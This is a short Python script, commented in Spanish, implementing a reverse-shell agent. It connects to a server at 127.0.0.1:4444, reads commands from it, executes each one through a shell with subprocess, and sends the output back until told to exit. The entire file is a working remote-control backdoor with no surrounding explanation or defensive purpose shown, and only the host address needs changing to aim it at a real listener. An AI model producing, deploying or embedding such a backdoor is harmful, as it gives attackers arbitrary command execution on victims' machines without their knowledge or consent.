import asyncio
import subprocess

async def agent():
    reader, writer = await asyncio.open_connection("127.0.0.1", 4444)

    while True:
        data = await reader.read(1024)  # Espera comando del servidor
        command = data.decode().strip()

        if command.lower() == "exit":
            break  # Cierra la conexión si recibe "exit"

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except Exception as e:
            output = str(e)

        writer.write(output.encode())  # Envía respuesta al servidor
        await writer.drain()

    writer.close()
    await writer.wait_closed()

asyncio.run(agent())
